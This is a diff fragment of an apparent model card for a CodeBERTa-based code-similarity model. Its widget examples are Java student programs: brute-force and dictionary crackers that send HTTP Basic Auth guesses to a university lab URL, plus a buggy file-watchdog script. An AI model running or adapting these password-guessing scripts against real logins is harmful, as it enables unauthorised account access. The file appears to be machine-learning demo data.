+    \ (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status) {\n\t\t\t \t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of attempts = \" + attempt);\n\t\t\t \t\t break\
+    \ exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t}\n\t } catch (FileNotFoundException e1) {\n\t\t\
+    \ \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException e2) {\n\t\t\n\t\te2.printStackTrace();\n\
+    \t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n\
+    \           new InputStreamReader\n              (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n\
+    \       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n           status = true;\n  \
+    \         }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url,\
+    \ String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty\
+    \ (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n\
+    \     }\n\n   public String userNamePasswordBase64(String username, String password) {\n     return \" \" + base64Encode\
+    \ (username + \":\" + password);\n     }\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D',\
+    \ 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n\
+    \       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+    \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+    \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+    \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+    \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 =\
+    \ 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n\
+    \             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n       \
+    \   }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2\
+    \ & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString\
+    \ += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n       \
+    \   encodedString += base64Array [c4];\n          break;\n        case 1:\n          encodedString += base64Array [c3];\n\
+    \          encodedString += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n\
+    \        }\n       }\n       return encodedString;\n   }\n }\n\n"
+  sentences:
+  - "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class BruteForce {\n\n   URLConnection conn = null;\n\
+    \   private static boolean status = false;\n\n   public static void main (String args[]){\n     BruteForce a = new BruteForce();\n\
+    \     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n     \t\t\t\t \"\"};\n\
+    \     int attempts = 0;\n     exit:\n     for (int i=0;i<pwdArray.length;i++) {\n\t\t for (int j=0;j<pwdArray.length;j++)\
+    \ {\n\t\t\t for (int k=0;k<pwdArray.length;k++) {\n\t\t\t\t if (pwdArray[i] == ' ' && pwdArray[j] != ' ') continue;\n\t\
+    \t\t\t if (pwdArray[j] == ' ' && pwdArray[k] != ' ') continue;\n\t\t\t\t inp[2] = inp[2] + pwdArray[i] + pwdArray[j] +\
+    \ pwdArray[k];\n\t\t\t\t attempts++;\n     \t\t\t a.doit(inp);\n  \n  \t\t\t\t if (status) {\n\t\t\t\t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t\t\t System.out.println(\"Number of attempts = \" + attempts);\n\t\t\t\t\t break\
+    \ exit;\n\t\t\t \t }\n     \t\t\t inp[2] = \"\";\n\t\t \t }\n\t \t }\n      }\n     }\n\n   public void doit(String args[])\
+    \ {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n           new InputStreamReader\n           \
+    \   (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null)\
+    \ {\n           System.out.println(line);\n           status = true;\n           }\n       }\n     catch (IOException\
+    \ e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url, String uname, String pword)\n        throws\
+    \ IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n\
+    \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username,\
+    \ String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static\
+    \ char pwdArray [] = {\n\t        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',\n\t        'i', 'j', 'k', 'l', 'm', 'n', 'o',\
+    \ 'p',\n\t        'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\n\t        'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',\n\t     \
+    \   'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',\n\t        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',\n\t        'W', 'X', 'Y',\
+    \ 'Z', ' '\n  };\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n\
+    \       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a',\
+    \ 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u',\
+    \ 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private\
+    \ static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes\
+    \ ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte\
+    \ b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n  \
+    \        }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n   \
+    \          pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1\
+    \ >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >>\
+    \ 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array\
+    \ [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n          encodedString\
+    \ += base64Array [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString\
+    \ += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+    \   }\n       return encodedString;\n   }\n }\n\n"
+  - "\n\n\n\n\n\nimport java.util.*;\nimport java.io.*;\nimport java.net.*;\n\npublic class MyWatchDogTimer extends TimerTask\n\
+    {\n\tpublic void run()\n\t{\n\t  Runtime rt = Runtime.getRuntime();\n\t  Process prss= null;\n\t  String initialmd5,presentmd5,finalmd5,temp1;\n\
+    \          String mesg1 = new String();\n          String subject = new String(\"Report of WatchDog\");\n\n\t  int i;\n\
+    \          \n\t  try\n          {\n\n              prss = rt.exec(\"md5sum first.html\");\n\n              InputStreamReader\
+    \ instre1 = new InputStreamReader(prss.getInputStream());\n              BufferedReader bufread1 = new BufferedReader(instre1);\n\
+    \t\t    \n             sw  = bufread1.readLine();\n\t      i = finalmd5.indexOf(' ');\n\t      initialmd5 = finalmd5.substring(0,i);\n\
+    \t      System.out.println(\"this is of first.html--->\"+initialmd5);\n\t\t    \n\n\t\t    \n              prss = rt.exec(\"\
+    wget -R mpg,mpeg, --output-document=present.html http://www.cs.rmit.edu./students/\");\n\n\t\t    \n              prss\
+    \ = rt.exec(\"md5sum present.html\");\n\t\t    \n              InputStreamReader instre2 = new InputStreamReader(prss.getInputStream());\n\
+    \              BufferedReader bufread2 = new BufferedReader(instre2);\n\t\t    \n\t      temp1 = bufread2.readLine();\n\
+    \t      i = temp1.indexOf(' ');\n\t      presentmd5 = temp1.substring(0,i);\n\t      System.out.println(\"this is of present.html---->\"\
+    +presentmd5);\n\t\t\n    \n                 if(initialmd5.equals(presentmd5))\n                     System.out.println(\"\
+    The checksum found using md5sum is same\");\n\t\t else\n\t\t    {\n\t\t      prss = rt.exec(\"diff first.html present.html\
+    \ > diff.html\");\n                      System.out.println(\" is different\"); \n                      prss = null;\n\
+    \                  mesg1 =\"php mail.php\";\n\t\t      prss = rt.exec(mesg1);\n\t\t    }   \n\n                   prss\
+    \ = rt.exec(\"rm present.*\");\n\n    \t     }catch(java.io.IOException e){}\n\n        }\n}\t\t\n"
+  - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+    \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+    \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new String(\"\
+    http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd = getPasswd();\n\
+    \       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\
+    \n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n       \
+    \    }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"The passsword\
+    \ is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n  \n      String\
+    \ r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     Dictionary\
+    \ a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"Trying again\");\n\tDictionary\
+    \ a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n\n int i=0;int j=0;\n\
+    \ attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for URL reply....... \");\n \
+    \ String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream (\"words\");\n\
+    \ DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n count++;\n\
+    \ \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+    \     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String username, String password)\
+    \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array\
+    \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+    \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+    \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n   \
+    \    '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String\
+    \ encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i <\
+    \ bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n\
+    \          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n \
+    \         if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n    \
+    \         b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4)\
+    \ | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n      \
+    \ encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case\
+    \ 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n \
+    \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+    \         case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+    \   }\n }\n\n"
+- source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+    \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+    \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n\
+    \     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new BufferedReader(new\
+    \ FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] != null) {\n\t\n\t\t\t if\
+    \ (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status) {\n\t\t\t \t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of attempts = \" + attempt);\n\t\t\t \t\t break\
+    \ exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t}\n\t } catch (FileNotFoundException e1) {\n\t\t\
+    \ \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException e2) {\n\t\t\n\t\te2.printStackTrace();\n\
+    \t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n\
+    \           new InputStreamReader\n              (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n\
+    \       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n           status = true;\n  \
+    \         }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url,\
+    \ String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty\
+    \ (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n\
+    \     }\n\n   public String userNamePasswordBase64(String username, String password) {\n     return \" \" + base64Encode\
+    \ (username + \":\" + password);\n     }\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D',\
+    \ 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n\
+    \       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+    \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+    \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+    \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+    \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 =\
+    \ 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n\
+    \             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n       \
+    \   }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2\
+    \ & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString\
+    \ += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n       \
+    \   encodedString += base64Array [c4];\n          break;\n        case 1:\n          encodedString += base64Array [c3];\n\
+    \          encodedString += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n\
+    \        }\n       }\n       return encodedString;\n   }\n }\n\n"
+  sentences:
+  - "package java.httputils;\n\nimport java.io.BufferedReader;\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\n\
+    import java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.sql.Timestamp;\n\n\npublic class Dictionary\
+    \ extends BruteForce\n{\n    protected String wordFile;\n\n    public Dictionary()\n    {\n        super();\n    }\n\n\
+    \    public static void main(String[] args)\n    {\n        Dictionary dictionary = new Dictionary();\n\n        if (args.length\
+    \ < 3)\n        {\n            System.out.println(dictionary.printUsage());\n        }\n        else\n        {\n    \
+    \        dictionary.setURL(args[0]);\n            dictionary.setUserName(args[1]);\n            dictionary.setWordFile(args[2]);\n\
+    \n            if (args.length > 3)\n            {\n                dictionary.setFileName(args[3]);\n            }\n \
+    \           dictionary.process();\n            System.out.println(dictionary.printResult());\n            System.exit(1);\n\
+    \        }\n    }\n\n    public void process()\n    {\n        attempts = 0;\n        String password = \"\";\n      \
+    \  \n        setStart(new Timestamp(System.currentTimeMillis()));\n\n        BufferedReader input = null;\n        try\n\
+    \        {\n            FileReader file = new FileReader(getWordFile());\n            \n            input = new BufferedReader(file);\n\
+    \            \n        }\n        catch (FileNotFoundException x)\n        {\n            System.err.println(\"File not\
+    \ found: \" + getWordFile());\n            System.exit(2);\n        }\n\n        try\n        {\n            while ((password\
+    \ = input.readLine()) != null)\n            {\n                try\n                {\n                    \n        \
+    \            attempts++;\n                    BasicAuthHttpRequest req =\n                        new BasicAuthHttpRequest(\n\
+    \                            getURL(),\n                            getUserName(),\n                            password);\n\
+    \                    setPassword(password);\n                    setEnd(new Timestamp(System.currentTimeMillis()));\n\
+    \                    setContent(req.getContent().toString());\n\n                    \n                    if (getFileName()\
+    \ != null\n                        && getFileName().length() > 0)\n                    {\n                        createReport();\n\
+    \                    }\n                    return;\n                }\n                catch (MalformedURLException e)\n\
+    \                {\n                    e.printStackTrace();\n                    return;\n                }\n       \
+    \         catch (IOException e)\n                {\n\n                }\n            }\n        }\n        catch (IOException\
+    \ x)\n        {\n            x.printStackTrace();\n        }\n\n        \n        setEnd(new Timestamp(System.currentTimeMillis()));\n\
+    \n    }\n\n    public String printUsage()\n    {\n        StringBuffer s = new StringBuffer();\n\n        s.append(\"\
+    ** BruteForce proper usage **\\n\\n\");\n        s.append(\n            \"java ..httputils.Dictionary <URL> <UserName>\
+    \ <Word File> <OutputFile - Optional>\\n\\n\");\n\n        return s.toString();\n    }\n    \n    public String getWordFile()\n\
+    \    {\n        return wordFile;\n    }\n\n    \n    public void setWordFile(String string)\n    {\n        wordFile =\
+    \ string;\n    }\n\n}\n"
+  - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+    \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+    \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new String(\"\
+    http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd = getPasswd();\n\
+    \       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\
+    \n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n       \
+    \    }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"The passsword\
+    \ is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n  \n      String\
+    \ r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     Dictionary\
+    \ a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"Trying again\");\n\tDictionary\
+    \ a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n\n int i=0;int j=0;\n\
+    \ attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for URL reply....... \");\n \
+    \ String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream (\"words\");\n\
+    \ DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n count++;\n\
+    \ \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+    \     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String username, String password)\
+    \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array\
+    \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+    \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+    \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n   \
+    \    '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String\
+    \ encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i <\
+    \ bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n\
+    \          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n \
+    \         if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n    \
+    \         b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4)\
+    \ | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n      \
+    \ encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case\
+    \ 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n \
+    \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+    \         case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+    \   }\n }\n\n"
+  - "import java.net.*;\nimport java.io.*;\n\n public class Bruteforce {\n int attempts = 0;\n  int l = 65;int m = 65;int\
+    \ n = 65;\n   URLConnection conn = null;\n\n   public static void  main(String args[]){\n     \n\tBruteforce a = new Bruteforce();\n\
+    \        a.attack(args);\n     }\n\n   public void attack(String args[]) {\n   try {\n\n       String login = new String(\"\
+    \");\n       String url = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\
+    \n\t passwd = getPasswd();\n         BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new\
+    \ URL(url), login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+    \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+    The passsword is :\" + passwd + \"and got after \" + attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+    \    \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+    \ +r);\n     System.out.println(\"Trying again with new password\");\n     Bruteforce a = new Bruteforce();\n     a.attack(args);\n\
+    \    }\n     else\n     {\n\tSystem.out.println(\"Trying again with new password\");\n\tBruteforce a = new Bruteforce();\n\
+    \ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n    attempts++;\n\n    char i1 = 0;\n    char\
+    \ j1 = 0;\n    char k1 = 0;\n    \n     int i= l;     int j= m;     int k= n;\n\n    String c = new String();\n    String\
+    \ c1 = new String();\n    String c2 = new String();\n    String c3 = new String();\n    String c4 = new String();\n  \
+    \  boolean flag;\n\n    for (i=l;i<123;i++)\n    for (j=m;j<123;j++)\n    for (k=n;k<123;k++)\n    {\n        if( flag\
+    \ = true )\n        {\n\n    i1 = (char)i;\n    j1 = (char)j;\n    k1 = (char)k;\n\n    if (i==91) i=97;\n    if (j==91)\
+    \ j=97;\n    if (k==91) k=97;\n\n    c = i1+\"\";\n    c1 = j1+\"\";\n    c2 = k1+\"\";\n    c3 = c.concat(c1);\n    c4\
+    \ = c3.concat(c2);\n    }else break;\n    }\n    flag = false;\n    return c4;\n  }\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", PasswordBase64(uname,pword));\n     conn.connect ();\n   \
+    \  return conn.getInputStream();\n     }\n\n\n public String PasswordBase64(String username, String password) {\n    \
+    \ return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array [] = {\n\
+    \       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S',\
+    \ 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm',\
+    \ 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5',\
+    \ '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String encodedString\
+    \ = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length)\
+    \ {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 =\
+    \ 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i\
+    \ >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes\
+    \ [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n  \
+    \     byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array\
+    \ [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case 0:\n          encodedString +=\
+    \ base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n          encodedString\
+    \ += base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case  2:\n          encodedString\
+    \ += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n"
+model-index: null
+config:
+  architectures:
+  - RobertaModel
+  model_type: roberta
+  tokenizer_config:
+    bos_token: <s>
+    cls_token: <s>
+    eos_token: </s>
+    mask_token: <mask>
+    pad_token: <pad>
+    sep_token: </s>
+    unk_token: <unk>
+cardData:
+  tags:
+  - sentence-transformers
+  - sentence-similarity
+  - feature-extraction
+  - generated_from_trainer
+  - dataset_size:42960
+  - loss:BatchAllTripletLoss
+  - loss:TripletLoss
+  base_model: huggingface/CodeBERTa-small-v1
+  widget:
+  - source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+      \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+      \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\"\
+      ,\n     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new\
+      \ BufferedReader(new FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] !=\
+      \ null) {\n\t\n\t\t\t if (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status)\
+      \ {\n\t\t\t \t\t System.out.println(\"Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of\
+      \ attempts = \" + attempt);\n\t\t\t \t\t break exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t\
+      }\n\t } catch (FileNotFoundException e1) {\n\t\t \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException\
+      \ e2) {\n\t\t\n\t\te2.printStackTrace();\n\t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n \
